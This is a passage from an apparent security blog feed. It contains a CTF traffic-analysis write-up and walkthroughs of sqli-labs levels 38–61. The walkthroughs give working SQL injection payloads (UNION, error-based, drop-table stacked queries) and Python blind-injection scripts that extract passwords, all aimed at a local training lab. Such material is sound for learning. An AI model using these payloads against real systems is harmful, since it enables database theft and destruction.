id="10、黑客使用了什么账号登陆了mail系统（形式-username-password）"><a href="#10、黑客使用了什么账号登陆了mail系统（形式-username-password）" class="headerlink" title="10、黑客使用了什么账号登陆了mail系统（形式: username/password）"></a>10、黑客使用了什么账号登陆了mail系统（形式: username/password）</h4><p>既然说是mail系统那我们就在mail的两个包里面寻求答案，在mailtwo里面输入<code>http.request.method == &quot;POST&quot; and http contains &quot;password&quot;</code><br>出现很多相同username不同密码的请求，很有可能是在爆破mail系统，在mailtwo1这一个包里面同样的过滤还存在几条成立请求，对比一下时间，这应该是mailtwo还没爆破完mailtwo1这个包继续爆破，在mailtwo包里面的序号28的信息里面对应下面的几条response，发现一名叫wenwenni的人应该是登录成功的，经过了一个check的过程，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loginCheck = <span class="function"><span class="keyword">function</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(form.username.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.username.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(form.password.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.password.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.pars</span><br></pre></td></tr></table></figure><p>然后回显下面的信息<br><img src="https://s1.ax1x.com/2018/08/30/PjBQDx.png" alt="PjBQDx.png"><br>所以感觉应该有这样的重点字在里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; and ip.addr==192.168.94.59</span><br></pre></td></tr></table></figure><p>于是乎过滤，但是第一个包里面太多了，这一题其实我也不怎么确定，为什么与这么多success的还得继续爆破下去？希望有大佬能讲一讲。。。。<br>之鞥按照常规套路，把在mailtwo1包里面的筛出来的最后一个标记一下，再过滤回http，再来<code>ctrl+shift+N</code>跳到标记处，然后往回找有关登录的请求，找到的第一个请求。。。<br><a href="https://imgchr.com/i/PjBlb6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBlb6.md.png" alt="PjBlb6.md.png"></a></p><p>那个密码需要AES解密，利用上面的算法求出key大概是。。。个人感觉这题最有难度<br><a href="http://encode.chahuo.com/" target="_blank" rel="noopener">http://encode.chahuo.com/</a></p><p>解密出来的结果跟第三题的答案一样。。。。。后来看到有人说这是社工手段，直接套第三题答案，有意思有意思。。。。</p><h4 id="11、黑客获得的vpn-ip是多少"><a href="#11、黑客获得的vpn-ip是多少" class="headerlink" title="11、黑客获得的vpn,ip是多少"></a>11、黑客获得的vpn,ip是多少</h4><p>最后一题在vpntwo这个包里面直接点击统计-&gt;端点，又学到了一种方法<br>看到发包最多的是<code>10.3.4.3</code><br><a href="https://imgchr.com/i/PjB8UO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB8UO.md.png" alt="PjB8UO.md.png"></a><br>所以这个答案就是<code>10.3.4.3</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉流量分析还是有点套路的，第一点就是多用点contains语句，模糊匹配一下，关键字靠自己的灵活性以及分析过程得出的结论，个人感觉大部分题目会给出，比如的话有小马上传的时候，你会想到会存在关键字，比如eval,assert之类的东西吗，别人用拼接方式传的马那就另当别论了。。但是还是可以通过菜刀的一些标志来识别的，例如&gt;||&lt;之类符号，2333<br>第二就是各种自动化扫描器的指纹特征，还是得记一下，有点用，第三就是可以通过统计去发现某些ip的发包次数，从而确定可疑ip</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。
    
    </summary>
    
      <category term="流量分析" scheme="0verwatch.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="流量分析" scheme="0verwatch.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(四)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-4/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-4/</id>
    <published>2018-08-29T12:01:56.000Z</published>
    <updated>2018-08-29T12:15:56.261Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，<a id="more"></a>超过次数就会重新安排<br>代码审计发现是简单的单引号闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;XG5G593V9H&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,secret_0IMA,3 from XG5G593V9H where id=1%23</span><br></pre></td></tr></table></figure><p>提交获得的信息重置刷新次数</p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>这次变成了14次<br>先构造测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=1) %23</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;8753JZ68TI&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,secret_UL8C,3 from 8753JZ68TI %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>构造一下<br><code>http://192.168.100.105/sqlilabs/Less-56/?id=1&quot; %23</code>回显成功后来一直拿他试结果失败了<br>看了源代码才知道原来是括号+单引号的闭合<br>找了一下原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>在数据库中执行确实能够查到数据，那么问题在哪呢？</p><p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<code>‘1”#’</code>转化为数字值为<code>1</code>，如果是<code>‘11fads’</code>则为<code>11</code>，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) %23</span><br></pre></td></tr></table></figure><p>这样才对<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;HVL992XP27&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,secret_E2BQ,3 from HVL992XP27%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>尝试一下闭合<br><code>http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,2,3 %23</code>发现这个有回显，常规套路<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;YRA6E572GR&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,secret_LA1G,3 from YRA6E572GR %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>这一关变成了5次<br>但是一侧就测试出来是单引号的闭合<br>执行以后发现不可以用union注入。。。因为不返回任何有数据库里面的信息<br>这段代码对其进行了处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure><p>下面有报错我们可以利用报错注入<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;XXQT0FJQL2&apos;),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select secret_LVSS from XXQT0FJQL2),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>同样的报错注入，只需要加个注释，什么单引号双引号闭合都没有<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;CA4PGB5VU5&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select secret_O5UY from CA4PGB5VU5),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>这一次是<code>双引号+括号</code>的闭合<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;ZIYD79H66Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select secret_JIPP from ZIYD79H66Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>此题完结</p><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>这次是单引号+两个括号的闭合，也是够变态的<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;0NCH5HWI5Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select secret_6IKU from 0NCH5HWI5Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>完结</p><h3 id="Less-62-Less65"><a href="#Less-62-Less65" class="headerlink" title="Less-62-Less65"></a>Less-62-Less65</h3><p>都是一样的都需要盲注，但是给的次数太少，很难跑出来，等我算法学得好一点再去把脚本写出来吧</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>终于把这个SQL注入的平台的题目给做完了，最近感冒难受的一批。。。撒花~~~</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-54&quot;&gt;&lt;a href=&quot;#Less-54&quot; class=&quot;headerlink&quot; title=&quot;Less-54&quot;&gt;&lt;/a&gt;Less-54&lt;/h3&gt;&lt;p&gt;从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(三)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-3/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-3/</id>
    <published>2018-08-29T12:01:31.000Z</published>
    <updated>2018-08-29T12:15:59.167Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，<a id="more"></a>但是比赛中是不大会用的，但是对于这几个环境我还是偏向union注入所以我还是以union注入的方式显示</p><p>换了mysqli的连接方式，但是换汤不换药<br>直接单引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=-1&apos; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>报错尝试一下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>这个题直接注释掉后面的部分就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-39/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>普通的union注入就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1234&apos;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>也可以尝试一下盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1&apos;) and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>union注入也可以，盲注也可以<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-41/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-41/?id=1 and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>这个题目查看源码你会发现登陆页面的password是没有过滤好的，我么可以利用此处进行堆叠注入增加，我们可以利用这点直接删库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p>跟上一题一样password没有过滤<br>只是查询的语句改变了，我么需要闭合括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;);drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>跟上一题同样的思路，只是需要单引号闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>感觉跟43题没啥区别啊。。。</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>从这一关开始正式进入order by注入<br>查看一下源码语句是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br></pre></td></tr></table></figure><p>order by利用的三种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、直接添加注入语句 ?sort=(select ******)</span><br><span class="line">2、利用一些函数，例如rand函数，?sort=rand(sql语句)，而且此处rand(true)和rand(false)是不相同的。</span><br><span class="line">3、利用and，例如?sort=1 and (加sql语句)</span><br></pre></td></tr></table></figure><p>这一题目可以直借用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-46/?sort=rand(updatexml(1,concat(0x7e,database(),0x7e),1))</span><br></pre></td></tr></table></figure><p>也可以用盲注，利用表格最后一行去区分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-46/?sort=rand(ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125;)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Min+Max)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;td&gt;superman&lt;/td&gt;&lt;td&gt;genious&lt;/td&gt;&lt;/tr&gt;&lt;/font&gt;&lt;/table&gt;'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>这一次的order by注入需要闭合单引号<br>来个报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-47/?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>跟46题一样的盲注。</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>一直在尝试下面这两句话，发现一直没效果，奇了怪，自我感觉没问题。。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and rand(ascii(substr((select database()),1,1))&gt;127)%23</span><br><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and ascii(substr((select database()),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>再来尝试一下时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-49/?sort=1' and if(((ascii(substr((select password from users where username="admin"),&#123;_&#125;,1)))=&#123;__&#125;),sleep(4),false) --+'''</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">67</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>直接出来结果，这尼玛什么操作。。</p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>这可以直接报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-50?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>单引号闭合报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-51?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>同样直接盲注或者时间盲注都行，不需要单引号闭合没什么意义</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>又是一道单引号闭合的题目，直接时间盲注就可以出来参考Less-49的脚本</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这一部分的题目让我了解到怎么对付order by注入，很有意义，个人最喜欢还是用rand函数的那种办法<br>但前面的堆叠注入就感觉意义不大。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-38&quot;&gt;&lt;a href=&quot;#Less-38&quot; class=&quot;headerlink&quot; title=&quot;Less-38&quot;&gt;&lt;/a&gt;Less-38&lt;/h3&gt;&lt;p&gt;从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，
    
    </summary>
    
